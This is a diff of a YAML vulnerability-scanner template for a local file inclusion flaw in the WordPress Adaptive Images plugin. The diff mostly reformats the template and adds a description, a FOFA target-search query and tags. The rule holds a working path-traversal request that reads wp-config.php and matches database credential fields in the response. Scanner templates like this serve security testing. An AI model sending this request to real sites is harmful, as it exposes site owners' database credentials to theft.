@@ -1,14 +1,20 @@
 id: wordpress-ext-adaptive-images-lfi
 
 info:
-    name: Wordpress Ext Adaptive Images lfi
-    author: FiveAourThe(https://github.com/FiveAourThe)
-    severity: high
+  name: Wordpress Ext Adaptive Images lfi
+  author: FiveAourThe
+  severity: high
+  verified: false
+  description: |
+    Wordpress Ext Adaptive Images 存在本地文件包含漏洞，攻击者可以通过构造特殊的请求参数，包含服务器上的任意文件。
+    fofa: app="Wordpress"
+  tags: wordpress,ext,adaptive,images,lfi
+  created: 2025/03/13
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php
-        expression: response.status == 200 && response.body.bcontains(b"DB_NAME") && response.body.bcontains(b"DB_USER") && response.body.bcontains(b"DB_PASSWORD") && response.body.bcontains(b"DB_HOST")
+  r0:
+    request:
+      method: GET
+      path: /wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php
+    expression: response.status == 200 && response.body.bcontains(b"DB_NAME") && response.body.bcontains(b"DB_USER") && response.body.bcontains(b"DB_PASSWORD") && response.body.bcontains(b"DB_HOST")
 expression: r0()
